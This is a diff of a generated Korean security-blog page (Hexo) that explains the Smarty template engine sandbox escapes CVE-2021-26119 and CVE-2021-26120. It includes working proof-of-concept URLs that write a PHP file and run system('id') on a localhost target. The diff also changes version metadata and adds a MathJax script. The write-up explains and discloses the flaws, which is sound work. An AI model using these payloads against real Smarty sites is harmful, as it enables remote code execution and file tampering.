@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      335 자
+      403 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      8
        분
     </span>
   
@@ -242,47 +242,47 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html">Smarty Template Engine Sandbox escape PHP Code Injection</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Smarty Endgine &lt;= 3.1.38</p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Smarty는 PHP용 template engine입니다. Smarty는 presentation(html/css)과 app logic을 분리시키는 PHP insulation(sandbox)을 통해 injection 공격의 피해범위를 제한합니다. 하지만 Template injection이 가능할 때 sandbox escape를 할 수 있는 취약점이 발견되었습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Smarty&#xB294; PHP&#xC6A9; template engine&#xC785;&#xB2C8;&#xB2E4;. Smarty&#xB294; presentation(html/css)&#xACFC; app logic&#xC744; &#xBD84;&#xB9AC;&#xC2DC;&#xD0A4;&#xB294; PHP insulation(sandbox)&#xC744; &#xD1B5;&#xD574; injection &#xACF5;&#xACA9;&#xC758; &#xD53C;&#xD574;&#xBC94;&#xC704;&#xB97C; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Template injection&#xC774; &#xAC00;&#xB2A5;&#xD560; &#xB54C; sandbox escape&#xB97C; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
 <li>CVE-2021-26119</li>
 </ul>
-<p>super global 변수 <code>$smarty.template_object</code>를 이용한  Template injection이 가능할 때 Smarty의 인스턴스에 접근할 수 있습니다. <code>compile</code>함수가 <code>&#123;$poc=$smarty.template_object&#125;</code>와 같은 값을 받으면 <code>$poc</code>에 <code>Smarty_Internal_Template</code> 객체를 할당합니다.</p>
-<pre><code class="hljs csharp"><span class="hljs-keyword">object</span>(Smarty_Internal_Template)<span class="hljs-meta">#7 (24) &#123;  </span>
+<p>super global &#xBCC0;&#xC218; <code>$smarty.template_object</code>&#xB97C; &#xC774;&#xC6A9;&#xD55C;  Template injection&#xC774; &#xAC00;&#xB2A5;&#xD560; &#xB54C; Smarty&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>compile</code>&#xD568;&#xC218;&#xAC00; <code>{$poc=$smarty.template_object}</code>&#xC640; &#xAC19;&#xC740; &#xAC12;&#xC744; &#xBC1B;&#xC73C;&#xBA74; <code>$poc</code>&#xC5D0; <code>Smarty_Internal_Template</code> &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs csharp"><span class="hljs-keyword">object</span>(Smarty_Internal_Template)<span class="hljs-meta">#7 (24) {  </span>
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;_objType&quot;</span></span>]=&gt;
   <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)  
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;smarty&quot;</span></span>]=&gt;
-  &amp;<span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) &#123; ... &#125;</span>
+  &amp;<span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) { ... }</span>
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;source&quot;</span></span>]=&gt;
-  <span class="hljs-keyword">object</span>(Smarty_Template_Source)<span class="hljs-meta">#8 (16) &#123; ... &#125;</span>
+  <span class="hljs-keyword">object</span>(Smarty_Template_Source)<span class="hljs-meta">#8 (16) { ... }</span>
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;parent&quot;</span></span>]=&gt;
-  <span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) &#123; ... &#125;</span>
+  <span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) { ... }</span>
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;ext&quot;</span></span>]=&gt;
-  <span class="hljs-keyword">object</span>(Smarty_Internal_Extension_Handler)<span class="hljs-meta">#10 (4) &#123; ... &#125;</span>
+  <span class="hljs-keyword">object</span>(Smarty_Internal_Extension_Handler)<span class="hljs-meta">#10 (4) { ... }</span>
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;compiled&quot;</span></span>]=&gt;
-  <span class="hljs-keyword">object</span>(Smarty_Template_Compiled)<span class="hljs-meta">#11 (12) &#123; ... &#125;</span></code></pre>
+  <span class="hljs-keyword">object</span>(Smarty_Template_Compiled)<span class="hljs-meta">#11 (12) { ... }</span></code></pre>
 
-<p>위는 <code>Smarty_Internal_Template</code>객체입니다. 해커는 <code>[&quot;smarty&quot;]</code>또는 <code>[&quot;parent&quot;]</code> 값을 사용해 Smarty의 인스턴스에 접근할 수 있고 arbitrary file write로 공격 범위를 확장할 수 있습니다.</p>
-<pre><code class="hljs URL">http:&#x2F;&#x2F;localhost:8000&#x2F;page.php?poc&#x3D;string:&#123;$s&#x3D;$smarty.template_object-&gt;smarty&#125;&#123;$fp&#x3D;$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;</code></pre>
+<p>&#xC704;&#xB294; <code>Smarty_Internal_Template</code>&#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; <code>[&quot;smarty&quot;]</code>&#xB610;&#xB294; <code>[&quot;parent&quot;]</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; Smarty&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; arbitrary file write&#xB85C; &#xACF5;&#xACA9; &#xBC94;&#xC704;&#xB97C; &#xD655;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object-&gt;smarty}{$fp=$smarty.template_object-&gt;compiled-&gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)}</code></pre>
 
 
 
 <ul>
 <li>CVE-2021-26120</li>
 </ul>
-<p>template syntax를 컴파일하는 과정에서 <code>Smarty_Internal_Runtime_TPlFunction</code>클래스는 attacker controlled data인 <code>name</code>을 필터링하지 않아 함수 인젝션을 할 수 있습니다.</p>
-<pre><code class="hljs javascript"><span class="hljs-comment">/* input = &#123;function name=&#x27;test&#x27;&#125;&#123;/function&#125; */</span>
+<p>template syntax&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>Smarty_Internal_Runtime_TPlFunction</code>&#xD074;&#xB798;&#xC2A4;&#xB294; attacker controlled data&#xC778; <code>name</code>&#xC744; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD568;&#xC218; &#xC778;&#xC81D;&#xC158;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs javascript"><span class="hljs-comment">/* input = {function name=&apos;test&apos;}{/function} */</span>
 
-<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;smarty_template_function_test_8782550315ffc7c00946f78_05745875&#x27;</span>)) &#123;
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smarty_template_function_test_8782550315ffc7c00946f78_05745875</span>(<span class="hljs-params">Smarty_Internal_Template $_smarty_tpl,$params</span>) </span>&#123;
-	    foreach ($params <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;
+<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&apos;smarty_template_function_test_8782550315ffc7c00946f78_05745875&apos;</span>)) {
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smarty_template_function_test_8782550315ffc7c00946f78_05745875</span>(<span class="hljs-params">Smarty_Internal_Template $_smarty_tpl,$params</span>) </span>{
+	    foreach ($params <span class="hljs-keyword">as</span> $key =&gt; $value) {
             $_smarty_tpl-&gt;tpl_vars[$key] = <span class="hljs-keyword">new</span> Smarty_Variable($value, $_smarty_tpl-&gt;isRenderingCache);
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
 </code></pre>
 
-<p>입력 <code>&#123;function name=&#39;test&#39;&#125;&#123;/function&#125;</code>을 받은 컴파일러는 위와 같은 코드를 생성합니다. </p>
-<pre><code class="hljs URL">http:&#x2F;&#x2F;localhost:8000&#x2F;page.php?poc&#x3D;string:&#123;function+name&#x3D;&#39;rce()&#123;&#125;;system(&quot;id&quot;);function+&#39;&#125;&#123;&#x2F;function&#125;</code></pre>
+<p>&#xC785;&#xB825; <code>{function name=&apos;test&apos;}{/function}</code>&#xC744; &#xBC1B;&#xC740; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. </p>
+<pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{function+name=&apos;rce(){};system(&quot;id&quot;);function+&apos;}{/function}</code></pre>
 
 
             </div>
@@ -586,6 +586,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
